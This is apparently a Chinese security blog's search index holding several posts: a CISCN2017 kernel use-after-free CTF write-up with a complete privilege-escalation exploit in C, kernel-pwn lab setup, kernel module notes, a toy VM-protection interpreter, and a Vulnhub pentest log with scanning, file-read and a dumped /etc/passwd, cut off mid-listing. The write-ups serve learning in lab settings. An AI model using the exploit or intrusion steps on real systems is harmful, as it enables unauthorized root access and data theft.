<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【kernel-UAF】babydriver]]></title>
    <url>%2F2019%2F02%2F15%2F2019-2-15-kernel-UAF%2F</url>
    <content type="text"><![CDATA[题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 123boot.sh #启动脚本bzImage #内核binaryrootfs.cpio #文件系统映像 boot.sh ​ 可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件 ​ 可以发现flag的owner被设为root，以及它加载了babydriver.ko这个内核模块。很明显，漏洞应该就在这个模块中 防护机制： 1234567☁ 4.4.72 checksec babydriver.ko [*] &apos;/home/zs0zrc/pwn/kernel/babydriver/file/lib/modules/4.4.72/babydriver.ko&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x0) 将内核模块取出，用ida分析 分析下主要的函数 babyrelease 1234567int __fastcall babyrelease(inode *inode, file *filp)&#123; _fentry__(inode, filp); kfree(babydev_struct.device_buf); //释放堆空间 printk("device release\n"); return 0;&#125; 这里涉及到了一个结构体 babydevice_t 123456700000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429)00000000 ; XREF: .bss:babydev_struct/r00000000 device_buf dq ? ; XREF: babyrelease+6/r00000000 ; babyopen+26/w ... ; offset00000008 device_buf_len dq ? ; XREF: babyopen+2D/w00000008 ; babyioctl+3C/w ...00000010 babydevice_t ends babyopen 申请一块大小为0x40的空间，地址赋给babydev_struct.device_buf，同时将babydev_struct.device_buf_len设为0x40 12345678int __fastcall babyopen(inode *inode, file *filp)&#123; _fentry__(inode, filp); babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL); babydev_struct.device_buf_len = 64LL; printk("device open\n"); return 0;&#125; babyioctl 这个函数实现了一个设备控制命令0x10001，功能是将全局变量 babydev_struct中的babydev_struct.device_buf释放掉，然后再根据用户传入的size重新申请一块空间，并且将babydev_struct.device_buf_len设置为对应的值 123456789101112131415161718192021222324// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123; size_t v3; // rdx size_t v4; // rbx __int64 result; // rax _fentry__(filp, *(_QWORD *)&amp;command); v4 = v3; if ( command == 0x10001 ) &#123; kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL); babydev_struct.device_buf_len = v4; printk("alloc done\n"); result = 0LL; &#125; else &#123; printk(&amp;unk_2EB); result = -22LL; &#125; return result;&#125; babywirte 这里我用ida反编译的代码看的有点奇怪，所以我看了下汇编的代码，这里copy_from_user()中的参数应该是 copy_from_user(babydev_struct.device_buf,buffer,length)，就是从用户空间buffer中拷贝数据到babydev_struct.device_buf 1234567891011121314151617ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)&#123; size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_from_user(); result = v6; return result;&#125; babyread 这个和babywrite差不多，将babydev_struct.device_buf 的内容拷贝到buffer中 1234567891011121314151617ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123; size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer, length, offset); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_to_user(buffer); result = v6; return result;&#125; 漏洞点 这里存在一个伪条件竞争的UAF漏洞，如果同时打开两个设备，那么后面分配的设备会覆盖掉之前的设备，因为babydev_struct是全局变量。同理，如果释放掉第一个设备，那么第二个设备也是被释放过的。 利用思路 这里采用改写进程的cred结构体来达到提权的目的。 打开两次设备，通过ioctl改写设备大小为cred结构体的大小，然后释放掉设备 fork一个新进程，这个新进程的cred结构体所在的空间会和之前释放掉的设备的空间重合 通过另一个文件描述符写，将cred中的uid和gid改为0 对应版本的cred结构体，大小为0xa8 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; exp： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123; int fd1 = open("/dev/babydev",2); int fd2 = open("/dev/babydev",2); ioctl(fd1,0x10001,0xa8); close(fd1); int pid = fork(); if(pid &lt; 0) &#123; puts("[*] fork error!"); exit(0); &#125; else if (pid == 0) &#123; int buf[20]=&#123;0&#125;; write(fd2,buf,28); system("/bin/sh"); puts("you are root now"); &#125; else &#123; wait(NULL); &#125; return 0;&#125; 静态编译exp，然后将得到的二进制文件放入解压的文件夹下，重新打包系统 1find . | cpio -o --format=newc &gt; rootfs.cpio 启动系统，运行exp,获取root权限]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kernel_pwn入门之环境搭建]]></title>
    <url>%2F2019%2F01%2F31%2F2019-1-31-kernel_pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[跟着大佬的博客，开始学习搭建内核环境。开篇文章记录一下。 获取内核获取内核的方法有两种，一种是自己下载源码，然后编译，另一种是通过apt直接下载内核 编译内核 下载源码 通过官网下载 在 https://www.kernel.org/ 上下载，最初我下的是2.6.0版本，发下编译会遇到很多问题……然后就放弃了，下了一个4.1.1版本 https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz ubuntu上可以通过wget来下载 1wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz 通过apt来下载 根据内核版本搜索，例如 sudo apt search linux-headers-4. 但是我没有发现我下的4.1.1版本的….能下的最低版本都是4.10.0-1004，但是问题不大，随便挑了个4.10.1来下 下载源码 sudo apt install linux-headers-4.10.0-1004 最后下载的源码会在/usr/src目录下 安装需要的依赖 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码，进入源码目录 输入 1make menuconfig 然后就会见到这个界面，按照大佬的做法 123456进入kernel hacking勾选以下项目Kernel debuggingCompile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointersKGDB然后保存退出 生成bzImage 1make bzImage 经过漫长的等待，出现下图的信息，说明编译成功。然后bzImage在 /arch/x86/boot中，vmlinux在当前路径下 解释下几个名词 vmlinux是未压缩的内核 vmlinuz是vmlinux的压缩文件。 vmlinux 是ELF文件，即编译出来的最原始的文件。 vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件 zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核 下载内核 根据版本号搜索 sudo apt search linux-image- 挑个喜欢的下载 sudo apt download linux-image-4.10.0-1004-gcp 这个下载下来的是一个deb文件，解压后镜像在data.tar.xz中 编译busybox用来生成简易的文件镜像 busybox简介 BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小、并通常使用Linux内核，这使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”。[10] —摘自维基百科 busybox是Linux上的一个应用程序 它整合了许多Linux上常用的工具和命令 IBM的一篇关于busybox的文章 文章地址，写的很详细。 编译busybox 从官网上下载源代码https://busybox.net/ 我下的是busybox-1.30.0 解压，进入根目录 执行命令 make menuconfig，然后会出现一个界面 这里在Settings中勾选Build static binary (no shared libs)，然后save就可以了 编译，执行make install 编译完后会多出一个_install文件夹，这是编译后的结果 进入_install，然后输入如下命令 1234mkdir procmkdir systouch initchmod +x init 在init写入下面的内容，用于内核初始化 123456789101112#!/bin/shecho "&#123;==DBG==&#125; INIT SCRIPT"mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # 加载模块mdev -s # We need this to find /dev/sda laterecho -e "&#123;==DBG==&#125; Boot took $(cut -d' ' -f1 /proc/uptime) seconds"setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 打包成镜像 12#在busybox的_install目录下输入下面的命令find . | cpio -o --format=newc &gt; ./rootfs.img 启动系统这里用qemu来运行 qemu简介1QEMU（quick emulator）是一款由Fabrice Bellard等人编写的免费的可执行硬件虚拟化的（hardware virtualization）开源托管虚拟机（VMM）。其与Bochs，PearPC类似，但拥有高速（配合KVM），跨平台的特性。QEMU是一个托管的虚拟机镜像，它通过动态的二进制转换，模拟CPU，并且提供一组设备模型，使它能够运行多种未修改的客户机OS，可以通过与KVM（kernel-based virtual machine开源加速器）一起使用进而接近本地速度运行虚拟机（接近真实计算机的速度）。QEMU还可以为user-level的进程执行CPU仿真，进而允许了为一种架构编译的程序在另外一中架构上面运行（借由VMM的形式）。 ---摘自维基百科 qemu的官方文档链接地址 启动脚本 将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh，这是我是直接拿大佬的脚本来用的，加了一点注释，参数的具体意义可以参照qemu的官方文档。 1234567891011121314#! /bin/shqemu-system-x86_64 \-m 128M \ #指定虚拟机的RAM大小-kernel ./bzImage \ #指定内核-initrd ./rootfs.img \ #用于提供 INITRD镜像-append "root=/dev/ram rw oops=panic panic=1 kalsr" \ #-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \ #配置用户模式的网络-monitor /dev/null \ #将监视器重定向到主机设备/dev/null-smp cores=2,threads=1 \ #用于声明所有可能用到的cpus, i.e. sockets * cores * threads = maxcpus.-cpu kvm64,+smep \ #设置CPU的安全选项#-S 启动gdb调试#-gdb tcp:1234 等待gdb调试 运行这个脚本，启动qemu,等一下就可以了 编译ko内核环境搭好了，来学习下怎么编译模块文件 源码12345678910111213141516171819#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init init_fun(void)&#123; printk("&lt;1&gt;Hello,World! from the kernel space…\n"); return 0;&#125;static void __exit exit_fun(void)&#123; printk("&lt;1&gt;Goodbye, World! leaving kernel space…\n");&#125;module_init(init_fun);module_exit(exit_fun);MODULE_LICENSE("GPL"); Makefile1234567891011121314obj-m := hello.oKERNELDR := /home/zs0zrc/linux-4.1.1PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后编译，将编译后的得到的ko文件放入 _install目录下，并修改init文件。重新打包一下镜像 最后用qemu运行，可以发现多出了模块的输出 reference http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/ http://p4nda.top/2018/04/04/kernel-pwn-start/ https://www.ibm.com/developerworks/cn/linux/l-busybox/index.html https://www.ibm.com/developerworks/cn/linux/l-qemu/]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux内核模块编程学习笔记]]></title>
    <url>%2F2019%2F01%2F19%2F2019-1-19-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[最近想研究下linux内核，就开始学习内核模块编程，写篇博客，做下学习笔记。 内核模块编程模块的定义内核模块就是具有独立功能的程序，它能被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间运行。 用户编程和内核模块编程的区别 基本组成模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能。 内核编程3个必须的头文件 123#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt; 必须的两个函数 1234567891011121314//模块加载函数 static int __init init_fun(void) //函数名随意，__init和__exit是init.h中定义的宏&#123;// 初始化代码&#125;//模块卸载函数static void __exit exit_fun(void)&#123;// 释放代码&#125;module_init(init_fun); //驱动程序初始化的入口点module_exit(exit_fun); //对于可加载模块，内核在此处调用module_cleanup()函数，而对于内置的模块，它什么都不做。 一个简单的例子 12345678910111213141516171819// 基于 Linux 2.6的内核#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init init_fun( void )&#123; printk(“&lt;1&gt;Hello,World! from the kernel space…\n”); return 0;&#125;static void __exit exit_fun( void )&#123; printk(“&lt;1&gt;Goodbye, World! leaving kernel space…\n”);&#125;module_init(init_fun);module_exit(exit_fun);MODULE_LICENSE(“GPL”); //许可权限声明，如果不申明，模块加载时会收到内核的警告 模块编译工具：make(GNU的工程化编译工具) 工作原理： make 工具通过一个称为 Makefile 的文件来完成并自动维护编译工作。Makefile 需要按照某种语法进行编写，其中说明了如何编译各个源文件并连接生成可执行文件，并定义了源文件之间的依赖关系。 Makefile规则格式 : [tab] 冒号前面部分叫target，后面的部分叫前置条件，第二行必须由一个tab键起首，后面跟命令。 阮一峰 博客 这两篇文章可以做个入门 一个例子： 123456789# Makefile2.6obj-m += hellomod.o # 产生hellomod 模块的目标文件CURRENT_PATH := $(shell pwd) #模块所在的当前路径LINUX_KERNEL := $(shell uname -r) #Linux内核源代码的当前版本LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL) #Linux内核源代码的绝对路径all: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules #编译模块了clean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean #清理 常用的模块编程命令 lsmod 获得系统中加载了的所有模块以及模块间的依赖关系 cat /proc/modules 查看加载模块的信息 tree -a 在/sys/module 对应模块的文件夹下使用，可以显示一些联系 modinfo &lt;模块名&gt; 显示模块的信息 insmod &lt;模块名.ko&gt; 将模块插入内核 rmmod &lt;模块名.ko&gt; 将模块从内核中移除 后续如果有新东西的话会继续补充 reference linux 内核之旅]]></content>
      <categories>
        <category>CODE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向学习之虚拟机保护]]></title>
    <url>%2F2019%2F01%2F13%2F2019-11-13-%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[考试周终于过去了，是时候又要开始学习了。所以就研究下逆向中的虚拟机保护技术，下面记录下学习的过程，以及一些收获。 基础概念逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。简单点说就是将程序的代码转换自定义的操作码(opcode)，然后在程序执行时再通过解释这些操作码，选择对应的函数执行，从而实现程序原有的功能。 vm_start：虚拟机的入口函数，对虚拟机环境进行初始化 vm_dispatcher:调度器，解释opcode，并选择对应的handle函数执行，当handle执行完后会跳回这里，形成一个循环。 opcode :程序可执行代码转换成的操作码 ####虚拟机执行的基本流程 实现一个小型的虚拟机这里我通过实现一个简化版的小型虚拟机来加深对虚拟机的认识，语言用的是C语言。 要想实现虚拟机的话需要完成两个目标： 定义一套opcode 实现opcode的解释器 opcode只是一个标识，可以随便定义，这里我定义了4条指令，每条指令分别对应着一个字节的字节码。而opcode的解释器是用来对opcode进行解释，从而选择对应的handle函数执行。 定义opcode1234567enum opcodes&#123; MOV = 0xf1, XOR = 0xf2, RET = 0xf4, READ = 0xf5,&#125;; 因为我只是为了理解，所以就只定义了几个常用指令。这里我用了枚举类型来定义opcode，比较方便。 实现解释器opcode定义完后，就可以开始实现解释opcode的解释器了。解释器我们需要实现一个虚拟环境以及各个opcode对应的handle函数。虚拟环境则是真实物理机的一个虚拟，是自己定义的字节码运行的环境。 一些关键的结构体vm_cpu12345678typedef struct vm_cpus&#123; int r1; 虚拟寄存器r1 int r2; 虚拟寄存器r2 int r3; 虚拟寄存器r3 unsigned char *eip; 指向正在解释的opcode的地址 vm_opcode op_list[OPCODE_N]; opcode列表，存放了所有的opcode及其对应的处理函数&#125;vm_cpu; vm_opcode123456typedef struct&#123; unsigned char opcode; void (*handle)(void *); &#125;vm_opcode; 其中 r1-r3是我定义的通用寄存器，用来传参或者是存放返回值，eip指向正在解释的opcode的地址，op_list则存放了所有opcode及其对应的handle函数。 实现了虚拟环境后就可以开始实现解释器了。解释器的功能就是对opcode解析，选择相应的handle函数，并且将相应的参数传递给handle函数。由handle函数来解释执行一条指令 关键函数vm_init12345678910111213141516171819void vm_init(vm_cpu *cpu) //初始化虚拟机环境&#123; cpu-&gt;r1 = 0; cpu-&gt;r2 = 0; cpu-&gt;r3 = 0; cpu-&gt;eip = (unsigned char *)vm_code; //将eip指向opcode的地址 cpu-&gt;op_list[0].opcode = 0xf1; cpu-&gt;op_list[0].handle = (void (*)(void *))mov; //将操作字节码与对应的handle函数关联在一起 cpu-&gt;op_list[1].opcode = 0xf2; cpu-&gt;op_list[1].handle = (void (*)(void *))xor; cpu-&gt;op_list[2].opcode = 0xf5; cpu-&gt;op_list[2].handle = (void (*)(void *))read_; vm_stack = malloc(0x512); memset(vm_stack,0,0x512);&#125; vm_start123456789101112void vm_start(vm_cpu *cpu)&#123; /* 进入虚拟机 eip指向要被解释的opcode地址 */ cpu-&gt;eip = (unsigned char*)opcodes; while((*cpu-&gt;eip)!= RET)//如果opcode不为RET，就调用vm_dispatcher来解释执行 &#123; vm_dispatcher(*cpu-&gt;eip); &#125;&#125; vm_dispatcher12345678910111213void vm_dispatcher(vm_cpu *cpu)&#123; int i; for(i=0 ; i &lt; OPCODE_N ; i++) &#123; if(*cpu-&gt;eip == cpu-&gt;op_list[i].opcode) &#123; cpu-&gt;op_list[i].handle(cpu); break; &#125; &#125; &#125; handles12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455void mov(vm_cpu *cpu); void xor(vm_cpu *cpu); //xor flagvoid read_(vm_cpu *cpu); //call read ,read the flagvoid xor(vm_cpu *cpu)&#123; int temp; temp = cpu-&gt;r1 ^ cpu-&gt;r2; temp ^= 0x12; cpu-&gt;r1 = temp; cpu-&gt;eip +=1; //xor指令占一个字节 &#125;void read_(vm_cpu *cpu)&#123; char *dest = vm_stack; read(0,dest,12); //用于往虚拟机的栈上读入数据 cpu-&gt;eip += 1; //read_指令占一个字节 &#125;void mov(vm_cpu *cpu)&#123; //mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，第二到第五是要mov的数据在vm_stack上的偏移 //我这里只是实现了从vm_stack上取数据和存数据到vm_stack上 unsigned char *res = cpu-&gt;eip + 1; //寄存器标识 int *offset = (int *) (cpu-&gt;eip + 2); //数据在vm_stack上的偏移 char *dest = 0; dest = vm_stack; switch (*res) &#123; case 0xe1: cpu-&gt;r1 = *(dest + *offset); break; case 0xe2: cpu-&gt;r2 = *(dest + *offset); break; case 0xe3: cpu-&gt;r3 = *(dest + *offset); break; case 0xe4: &#123; int x = cpu-&gt;r1; *(dest + *offset) = x; break; &#125; &#125; cpu-&gt;eip += 6; //mov指令占六个字节，所以eip要向后移6位&#125; 要执行的伪代码解释器到这就实现完了。接下来是要将想要实现功能的伪代码转成自定义的opcode，伪代码的功能是从标准输入中读取12个字节的字符串，然后将读入的字符串每个字符与0x0还有0x12进行异或，并且将结果存储在虚拟机的栈上。写出来大致就是下面这样子 123456789101112131415161718192021222324252627282930313233343536373839404142/* call read_ MOV R1,flag[0] XOR MOV R1,0x20; //这是将R1的值送到vm_stack+0x20的位置，后面的同上 MOV R1,flag[1] XOR MOV R1,0x21; MOV R1,flag[2] XOR MOV R1,0x22 MOV R1,flag[3] XOR MOV R1,0x23; MOV R1,flag[4] XOR MOV R1,0x24; MOV R1,flag[5] XOR MOV R1,0x25; MOV R1,flag[6] XOR MOV R1,0x26; MOV R1,flag[7] XOR MOV R1,0x26 MOV R1,flag[7] XOR MOV R1,0X27 MOV R1,flag[7] XOR MOV R1,0x28 MOV R1,flag[7] XOR MOV R1,0X29 MOV R1,flag[7] XOR MOV R1,0x2A MOV R1,flag[7] XOR MOV R1,0x2b*/ 将它转换成对应的字节码，然后用解释器去解释执行就可以实现伪代码的功能。 1234567891011121314151617unsigned char vm_code[] = &#123; 0xf5, 0xf1,0xe1,0x0,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x20,0x00,0x00,0x00, 0xf1,0xe1,0x1,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x21,0x00,0x00,0x00, 0xf1,0xe1,0x2,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x22,0x00,0x00,0x00, 0xf1,0xe1,0x3,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x23,0x00,0x00,0x00, 0xf1,0xe1,0x4,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x24,0x00,0x00,0x00, 0xf1,0xe1,0x5,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x25,0x00,0x00,0x00, 0xf1,0xe1,0x6,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x26,0x00,0x00,0x00, 0xf1,0xe1,0x7,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x27,0x00,0x00,0x00, 0xf1,0xe1,0x8,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x28,0x00,0x00,0x00, 0xf1,0xe1,0x9,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x29,0x00,0x00,0x00, 0xf1,0xe1,0xa,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2a,0x00,0x00,0x00, 0xf1,0xe1,0xb,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2b,0x00,0x00,0x00, 0xf1,0xe1,0xc,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2c,0x00,0x00,0x00, 0xf4&#125;; 至此，简化版的小型虚拟机就实现完了。我在虚拟机中实现了对输入字符串简单的异或加密，并将加密后的值存储到指定位置。我觉得这个过程是十分有意义的，让我加深了对虚拟机保护的了解。因为能力有限，所以就只实现了一个很简单的小型虚拟机。虚拟机相关的题目还没有做，等有时间再去做一下。]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Vmare protect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub-Billu_b0x 靶机的渗透测试学习记录]]></title>
    <url>%2F2018%2F11%2F26%2F2018-11-26-Vulnhub-Billu_b0x-%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。 ​ 工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb 爆破目录 dirbuster 爆破目录 sqlmap 用来进行sql注入 蚁剑 文档 管理webshell kali虚拟机 收集信息 发现ip nmap -sP 192.168.133.1/24 -sP参数代表着ping扫描， 扫描kali所属的C网段 扫出的ip为192.168.133.150 端口扫描 nmap -p1-65535 -A 192.168.133.150 扫描目标机开的端口，及服务 发现开启了22端口和80端口 1222/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 访问80端口的web服务，只有一个登陆界面，并且提示 show me you sqli skills。说明这个页面存在sql注入，但是先不管它。 爆破目录 利用kali自带的dirb工具 dirb http://192.168.133.150:80 爆出来的路径, 得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy等 1234567891011121314151617181920212223242526272829303132333435root@zs0zrc:~# dirb http://192.168.133.150:80-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Mon Nov 26 18:48:26 2018URL_BASE: http://192.168.133.150:80/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.133.150:80/ ----+ http://192.168.133.150:80/add (CODE:200|SIZE:307) + http://192.168.133.150:80/c (CODE:200|SIZE:1) + http://192.168.133.150:80/cgi-bin/ (CODE:403|SIZE:291) + http://192.168.133.150:80/head (CODE:200|SIZE:2793) ==&gt; DIRECTORY: http://192.168.133.150:80/images/ + http://192.168.133.150:80/in (CODE:200|SIZE:47559) + http://192.168.133.150:80/index (CODE:200|SIZE:3267) + http://192.168.133.150:80/index.php (CODE:200|SIZE:3267) + http://192.168.133.150:80/panel (CODE:302|SIZE:2469) + http://192.168.133.150:80/server-status (CODE:403|SIZE:296) + http://192.168.133.150:80/show (CODE:200|SIZE:1) + http://192.168.133.150:80/test (CODE:200|SIZE:72) ---- Entering directory: http://192.168.133.150:80/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &apos;-w&apos; if you want to scan it anyway) -----------------END_TIME: Mon Nov 26 18:48:30 2018DOWNLOADED: 4612 - FOUND: 11 用dirbuster工具 漏洞挖掘 漏洞挖掘从下面几个方面入手 首页的SQL注入，毕竟它提示了 查看爆破目录的结果，看是否有什么其它有用的信息 用工具扫 如果可以得到网站的源码，也可以用工具去扫描漏洞 先SQL注入一波，话不多说，sqlmap开跑 sqlmap -u “http://192.168.133.150&quot; –data “un=admin&amp;ps=admin&amp;login=let%27s+login” –level 3 –dbms mysql 这个因为我试不出它过滤了什么，所以直接用salmap跑，跑了好久都跑不出来。打扰了 SQL注入，暂时failed 查看爆破出来的网页路径有没什么有用的信息 如下 1234567+ http://192.168.133.150:80/in (CODE:200|SIZE:47559) + http://192.168.133.150:80/index (CODE:200|SIZE:3267) + http://192.168.133.150:80/index.php (CODE:200|SIZE:3267) + http://192.168.133.150:80/panel (CODE:302|SIZE:2469) + http://192.168.133.150:80/server-status (CODE:403|SIZE:296) + http://192.168.133.150:80/show (CODE:200|SIZE:1) + http://192.168.133.150:80/test (CODE:200|SIZE:72) 分别访问下，感觉可能有用的几个 http://192.168.133.150:80/in 这个会将php的配置信息打印出来，会暴露一些敏感信息 http://192.168.133.150:80/server-status 不允许访问 http://192.168.133.150:80/test 这个要求”file”参数不为空，我试了下，发现是POST请求的参数。利用谷歌浏览器的插件POSTman，发送post请求，参数为 file = “test.php”。发现它直接将源代码返回给我了，利用这个可以读取所有网页的代码 发送POST请求 利用test读取文件的功能，读取/etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System 